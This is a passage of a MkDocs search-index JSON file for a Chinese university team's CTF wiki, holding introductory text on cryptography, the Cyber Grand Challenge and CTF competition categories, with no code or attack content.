{"config":{"lang":["ja"],"separator":"[\\s\\-\uff0c\u3002]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u7b80\u4ecb","text":""},{"location":"#hitsz-ctf-wiki","title":"HITSZ CTF Wiki","text":"<p>\u8fd9\u91cc\u662f\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66\uff08\u6df1\u5733\uff09 CTF\u56e2\u961f\u7684\u77e5\u8bc6\u5171\u4eab\u5e73\u53f0\uff0c\u65e8\u5728\u4e3aCTF\u5b66\u4e60\u8005\u63d0\u4f9b\u53c2\u8003 \u5185\u5bb9\u5305\u62ec\uff1a</p> <ul> <li>CTF\u5b66\u4e60\u6559\u7a0b\u3001\u5fc3\u5f97\u3001\u7ecf\u9a8c</li> <li>\u8d5b\u4e8b\u3001\u8bad\u7ec3\u9898writeup\u5206\u7c7b\u603b\u7ed3</li> <li>research \u6280\u672f\u7814\u7a76\u3001\u77e5\u8bc6\u70b9\u3001\u6280\u5de7</li> </ul>"},{"location":"#_2","title":"\u58f0\u660e","text":"<p>\u672c\u7f51\u7ad9\u57fa\u4e8e\u539f\u7248\u7684 CTF Wiki\uff0c\u4f9bCTF\u7231\u597d\u8005\u5b66\u4e60\u4f7f\u7528\u3002  \u539f\u7248 CTF Wiki \u94fe\u63a5\uff1ahttps://ctf-wiki.org</p>"},{"location":"#_3","title":"\u989c\u8272\u4e3b\u9898","text":""},{"location":"#_4","title":"\u914d\u8272\u65b9\u6848","text":"<p>\u6839\u636e\u6d4f\u89c8\u5668\u4e0e\u7cfb\u7edf\u8bbe\u7f6e\u81ea\u52a8\u5207\u6362\u660e\u6697\u4e3b\u9898\uff0c\u4e5f\u53ef\u624b\u52a8\u5207\u6362</p> <code>Default</code> <code>Slate</code>"},{"location":"#_5","title":"\u4e3b\u8272","text":"<p>\u70b9\u51fb\u8272\u5757\u53ef\u66f4\u6362\u4e3b\u9898\u7684\u4e3b\u8272</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code> <code>Brown</code> <code>Grey</code> <code>Blue Grey</code> <code>White</code>"},{"location":"#_6","title":"\u8f85\u52a9\u8272","text":"<p>\u70b9\u51fb\u8272\u5757\u66f4\u6362\u4e3b\u9898\u7684\u8f85\u52a9\u8272</p> <code>Red</code> <code>Pink</code> <code>Purple</code> <code>Deep Purple</code> <code>Indigo</code> <code>Blue</code> <code>Light Blue</code> <code>Cyan</code> <code>Teal</code> <code>Green</code> <code>Light Green</code> <code>Lime</code> <code>Yellow</code> <code>Amber</code> <code>Orange</code> <code>Deep Orange</code>"},{"location":"discussion/","title":"\u8ba8\u8bba\u4ea4\u6d41","text":"<p>\u5982\u679c\u4f60\u6709\u4efb\u4f55\u60f3\u8981\u8ba8\u8bba\u7684\u95ee\u9898\uff0c\u8bf7\u9009\u62e9 Github Discussion \u6216\u8005 Slack.</p>"},{"location":"join/","title":"\u52a0\u5165\u6211\u4eec","text":"<p>\u5982\u679c\u60a8\u662f\u7f51\u7edc\u5b89\u5168\u7231\u597d\u8005\uff0c\u60f3\u8981\u52a0\u5165\u6211\u4eec\u4e00\u8d77\u5b66\u4e60\u4ea4\u6d41\u3001\u53c2\u52a0\u6bd4\u8d5b\u548c\u79d1\u7814\u9879\u76ee\uff0c\u6b22\u8fce\u52a0\u5165\u6211\u4eec   </p> <ul> <li>QQ\u7fa4\uff1a742663655</li> <li>\u5fae\u4fe1\u7fa4\u8bf7\u8054\u7cfb\u7ba1\u7406\u5458\u9080\u8bf7\u52a0\u5165</li> </ul>"},{"location":"members/","title":"\u6210\u5458","text":""},{"location":"members/#_2","title":"\uff08\u59d3\u6c0f\u6392\u540d\uff0c\u4e0d\u5206\u5148\u540e\uff09","text":""},{"location":"members/#2020","title":"2020\u7ea7","text":""},{"location":"members/#2019","title":"2019\u7ea7","text":""},{"location":"members/#2018","title":"2018\u7ea7","text":""},{"location":"usage/","title":"\u5982\u4f55\u4f7f\u7528 CTF Wiki","text":""},{"location":"usage/#_1","title":"\u7b80\u4ecb","text":"<p>CTF Wiki \u7531\u4e09\u4e2a\u59ca\u59b9\u9879\u76ee\u6784\u6210</p> <ul> <li>ctf-wiki\uff0c\u4ecb\u7ecd CTF \u76f8\u5173\u5b89\u5168\u77e5\u8bc6\u3002</li> <li>ctf-challenges\uff0c\u5b58\u50a8 CTF Wiki \u4e2d\u4f7f\u7528\u5230\u7684\u9898\u76ee\u4ee5\u53ca\u4e00\u4e9b\u5178\u578b\u9898\u76ee\u7684\u9644\u4ef6\u3001\u9898\u89e3\u3002</li> <li>ctf-tools\uff0c\u4ecb\u7ecd CTF \u4e2d\u5e38\u7528\u5230\u7684\u5de5\u5177\u3002</li> </ul>"},{"location":"usage/#_2","title":"\u5982\u4f55\u627e\u9898\u76ee\u9644\u4ef6","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5728 <code>ctf-challenges</code> \u4ed3\u5e93\u4e0b\u627e\u5230\u9898\u76ee\u9644\u4ef6\u3002\u4ee5\u57fa\u672c rop \u4e2d\u7684\u9898\u76ee\u4e3a\u4f8b\uff0c\u5177\u4f53\u8def\u5f84\u5982\u4e0b\uff1ahttps://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow\u3002</p>"},{"location":"crypto/introduction/","title":"Crypto\u7b80\u4ecb","text":"<p>\u5bc6\u7801\u5b66\uff08Cryptography\uff09\u4e00\u822c\u53ef\u5206\u4e3a\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u3002</p> <p>\u5176\u4e2d\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u7528\u6027\u827a\u672f\u5b58\u5728\uff0c\u5176\u7f16\u7801\u548c\u7834\u8bd1\u901a\u5e38\u4f9d\u8d56\u4e8e\u8bbe\u8ba1\u8005\u548c\u654c\u624b\u7684\u521b\u9020\u529b\u4e0e\u6280\u5de7\uff0c\u5e76\u6ca1\u6709\u5bf9\u5bc6\u7801\u5b66\u539f\u4ef6\u8fdb\u884c\u6e05\u6670\u7684\u5b9a\u4e49\u3002\u53e4\u5178\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u5355\u8868\u66ff\u6362\u52a0\u5bc6\uff08Monoalphabetic Cipher\uff09</li> <li>\u591a\u8868\u66ff\u6362\u52a0\u5bc6\uff08Polyalphabetic Cipher\uff09</li> <li>\u5947\u5947\u602a\u602a\u7684\u52a0\u5bc6\u65b9\u5f0f</li> </ul> <p>\u800c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5219\u8d77\u6e90\u4e8e 20 \u4e16\u7eaa\u4e2d\u540e\u671f\u51fa\u73b0\u7684\u5927\u91cf\u76f8\u5173\u7406\u8bba\uff0c1949 \u5e74\u9999\u519c\uff08C. E. Shannon\uff09\u53d1\u8868\u4e86\u9898\u4e3a\u300a\u4fdd\u5bc6\u7cfb\u7edf\u7684\u901a\u4fe1\u7406\u8bba\u300b\u7684\u7ecf\u5178\u8bba\u6587\u6807\u5fd7\u7740\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u5f00\u59cb\u3002\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a</p> <ul> <li>\u5bf9\u79f0\u52a0\u5bc6\uff08Symmetric Cryptography\uff09\uff0c\u4ee5 DES\uff0cAES\uff0cRC4 \u4e3a\u4ee3\u8868\u3002</li> <li>\u975e\u5bf9\u79f0\u52a0\u5bc6\uff08Asymmetric Cryptography\uff09\uff0c\u4ee5 RSA\uff0cElGamal\uff0c\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\u4e3a\u4ee3\u8868\u3002</li> <li>\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\uff0c\u4ee5 MD5\uff0cSHA-1\uff0cSHA-512 \u7b49\u4e3a\u4ee3\u8868\u3002</li> <li>\u6570\u5b57\u7b7e\u540d\uff08Digital Signature\uff09\uff0c\u4ee5 RSA \u7b7e\u540d\uff0cElGamal \u7b7e\u540d\uff0cDSA \u7b7e\u540d\u4e3a\u4ee3\u8868\u3002</li> </ul> <p>\u5176\u4e2d\uff0c\u5bf9\u79f0\u52a0\u5bc6\u4f53\u5236\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>\u5206\u7ec4\u5bc6\u7801\uff08Block Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u5757\u5bc6\u7801\u3002</li> <li>\u5e8f\u5217\u5bc6\u7801\uff08Stream Cipher\uff09\uff0c\u53c8\u79f0\u4e3a\u6d41\u5bc6\u7801\u3002</li> </ul> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u8bbe\u8ba1\u8005\u7684\u6839\u672c\u76ee\u6807\u662f\u4fdd\u969c\u4fe1\u606f\u53ca\u4fe1\u606f\u7cfb\u7edf\u7684</p> <ul> <li>\u673a\u5bc6\u6027\uff08Confidentiality\uff09</li> <li>\u5b8c\u6574\u6027\uff08Integrity\uff09</li> <li>\u53ef\u7528\u6027\uff08Availability\uff09</li> <li>\u8ba4\u8bc1\u6027\uff08Authentication\uff09</li> <li>\u4e0d\u53ef\u5426\u8ba4\u6027\uff08Non-repudiation\uff09</li> </ul> <p>\u5176\u4e2d\uff0c\u524d\u4e09\u8005\u88ab\u79f0\u4e3a\u4fe1\u606f\u5b89\u5168\u7684 CIA \u4e09\u8981\u7d20 \u3002</p> <p>\u800c\u5bf9\u4e8e\u5bc6\u7801\u7834\u89e3\u8005\u6765\u8bf4\uff0c\u4e00\u822c\u662f\u8981\u60f3\u529e\u6cd5\u8bc6\u522b\u51fa\u5bc6\u7801\u7b97\u6cd5\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u6216\u8005\u5229\u7528\u5bc6\u7801\u4f53\u5236\u7684\u6f0f\u6d1e\u8fdb\u884c\u7834\u89e3\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u865a\u5047\u7684\u54c8\u5e0c\u503c\u6216\u8005\u6570\u5b57\u7b7e\u540d\u6765\u7ed5\u8fc7\u76f8\u5e94\u7684\u68c0\u6d4b\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u5df2\u77e5\u5f85\u7834\u89e3\u7684\u5bc6\u7801\u4f53\u5236\uff0c\u800c\u653b\u51fb\u7c7b\u578b\u901a\u5e38\u5206\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a</p> \u653b\u51fb\u7c7b\u578b \u8bf4\u660e \u552f\u5bc6\u6587\u653b\u51fb \u53ea\u62e5\u6709\u5bc6\u6587 \u5df2\u77e5\u660e\u6587\u653b\u51fb \u62e5\u6709\u5bc6\u6587\u4e0e\u5bf9\u5e94\u7684\u660e\u6587 \u9009\u62e9\u660e\u6587\u653b\u51fb \u62e5\u6709\u52a0\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u660e\u6587\u52a0\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u5bc6\u6587 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \u62e5\u6709\u89e3\u5bc6\u6743\u9650\uff0c\u80fd\u591f\u5bf9\u5bc6\u6587\u89e3\u5bc6\u540e\u83b7\u5f97\u76f8\u5e94\u660e\u6587 <p>Note</p> <p>\u6ce8\uff1a\u4e4b\u524d\u5728\u8fd9\u91cc\u66fe\u5199\u8fc7\u8fd9\u4e9b\u653b\u51fb\u5e38\u89c1\u7684\u573a\u666f\uff0c\u968f\u7740\u4e0d\u65ad\u5730\u5b66\u4e60\uff0c\u6e10\u6e10\u610f\u8bc6\u5230\u8fd9\u4e9b\u653b\u51fb\u7c7b\u578b\u4fa7\u91cd\u63cf\u8ff0\u653b\u51fb\u8005\u7684\u80fd\u529b\uff0c\u6709\u53ef\u80fd\u9002\u7528\u4e8e\u5404\u79cd\u5404\u6837\u7684\u573a\u666f\u3002\u6545\u8fdb\u884c\u4fee\u6b63\u3002</p> <p>\u8fd9\u91cc\u63a8\u8350\u4e00\u4e9b\u8d44\u6599</p> <ul> <li>\u53ef\u6c57\u5b66\u9662\u516c\u5f00\u8bfe</li> <li>\u6df1\u5165\u6d45\u51fa\u5bc6\u7801\u5b66\u2014\u2014\u5e38\u7528\u52a0\u5bc6\u6280\u672f\u539f\u7406\u4e0e\u5e94\u7528</li> <li>https://cryptopals.com/\uff0c\u4e00\u5806\u5bc6\u7801\u5b66\u7684\u7ec3\u4e60\u9898\u76ee\u3002</li> </ul> <p>Note</p> <p>\u63a8\u8350\u5728\u770b\u5b8c\u516c\u5f00\u8bfe\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u53ca\u7b80\u5355\u770b\u770b\u7535\u5b50\u4e66\u7684\u60c5\u51b5\u4e0b\u5728\u8003\u8651\u662f\u5426\u8981\u8d2d\u4e70\u4e66\uff0c\u56e0\u4e3a\u4e66\u4e70\u56de\u6765\u4e00\u822c\u90fd\u88ab\u95f2\u7f6e\u8d77\u6765\u4e86\u3002</p>"},{"location":"crypto/introduction/#_1","title":"\u53c2\u8003","text":"<ul> <li>\u7ef4\u57fa\u767e\u79d1-\u5bc6\u7801\u5b66</li> </ul> <p>Info</p> <p>\u672c\u8282\u5927\u90e8\u5206\u5b9a\u4e49\u4e0e\u4f8b\u5b50\u53c2\u8003\u4e86\u7ef4\u57fa\u767e\u79d1\u3002</p>"},{"location":"introduction/cgc/","title":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b","text":"<p>\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002</p> <p>CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u6d1e\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort\u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002</p> <p>\u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002</p> <p>\u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002</p>"},{"location":"introduction/cgc/#_1","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807","text":"<ol> <li>\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b</li> <li>\u6253\u8865\u4e01\u9891\u7387\uff1b</li> <li>\u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b</li> <li>\u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b</li> <li>\u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002</li> </ol>"},{"location":"introduction/cgc/#_2","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1","text":"<p>\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002</p>"},{"location":"introduction/cgc/#_3","title":"\u5206\u6790\u65b9\u6cd5","text":"<ol> <li>\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b</li> <li>\u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b</li> <li>\u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002</li> </ol>"},{"location":"introduction/cgc/#cgc_1","title":"CGC \u7ecf\u9a8c\u603b\u7ed3","text":"<ol> <li>\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b</li> <li>\u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b</li> <li>\u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b</li> <li>\u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u503c\u5f97\u7814\u7a76\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002</li> </ol>"},{"location":"introduction/content/","title":"CTF \u7ade\u8d5b\u5185\u5bb9","text":"<p>\u7531\u4e8e CTF \u7684\u8003\u9898\u8303\u56f4\u5176\u5b9e\u6bd4\u8f83\u5bbd\u5e7f\uff0c\u76ee\u524d\u4e5f\u6ca1\u6709\u592a\u660e\u786e\u7684\u89c4\u5b9a\u754c\u9650\u8bf4\u4f1a\u8003\u54ea\u4e9b\u5185\u5bb9\u3002\u4f46\u662f\u5c31\u76ee\u524d\u7684\u6bd4\u8d5b\u9898\u578b\u800c\u8a00\u7684\u8bdd\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u636e\u5e38\u89c1\u7684 Web \u7f51\u7edc\u653b\u9632\u3001RE \u9006\u5411\u5de5\u7a0b\u3001Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528\u3001Crypto \u5bc6\u7801\u653b\u51fb\u3001Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u6765\u8fdb\u884c\u5206\u7c7b\u3002</p> <ul> <li> <p>Web - \u7f51\u7edc\u653b\u9632</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86 Web \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\uff0c\u5982 SQL \u6ce8\u5165\u3001XSS\u3001CSRF\u3001\u6587\u4ef6\u5305\u542b\u3001\u6587\u4ef6\u4e0a\u4f20\u3001\u4ee3\u7801\u5ba1\u8ba1\u3001PHP \u5f31\u7c7b\u578b\u7b49\uff0cWeb \u5b89\u5168\u4e2d\u5e38\u89c1\u7684\u9898\u578b\u53ca\u89e3\u9898\u601d\u8def\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5de5\u5177\u3002</p> </li> <li> <p>Reverse Engineering - \u9006\u5411\u5de5\u7a0b</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u7684\u5e38\u89c1\u9898\u578b\u3001\u5de5\u5177\u5e73\u53f0\u3001\u89e3\u9898\u601d\u8def\uff0c\u8fdb\u9636\u90e8\u5206\u4ecb\u7ecd\u4e86\u9006\u5411\u5de5\u7a0b\u4e2d\u5e38\u89c1\u7684\u8f6f\u4ef6\u4fdd\u62a4\u3001\u53cd\u7f16\u8bd1\u3001\u53cd\u8c03\u8bd5\u3001\u52a0\u58f3\u8131\u58f3\u6280\u672f\u3002</p> </li> <li> <p>Pwn - \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528</p> <p>Pwn \u9898\u76ee\u4e3b\u8981\u8003\u5bdf\u4e8c\u8fdb\u5236\u6f0f\u6d1e\u7684\u53d1\u6398\u548c\u5229\u7528\uff0c\u9700\u8981\u5bf9\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\u3002\u5728 CTF \u7ade\u8d5b\u4e2d\uff0cPWN \u9898\u76ee\u4e3b\u8981\u51fa\u73b0\u5728 Linux \u5e73\u53f0\u4e0a\u3002</p> </li> <li> <p>Crypto - \u5bc6\u7801\u653b\u51fb</p> <p>\u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002</p> </li> <li> <p>Mobile - \u79fb\u52a8\u5b89\u5168</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u95ee\u9898\u7c7b\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002</p> </li> <li> <p>Misc - \u5b89\u5168\u6742\u9879</p> <p>\u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002</p> </li> </ul>"},{"location":"introduction/content/#-","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9","text":"<p>2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u4e3e\u529e\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002</p> <ol> <li>\u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548cXSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002</li> <li>\u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK     \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002</li> <li>\u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86_64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002</li> <li>\u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002</li> 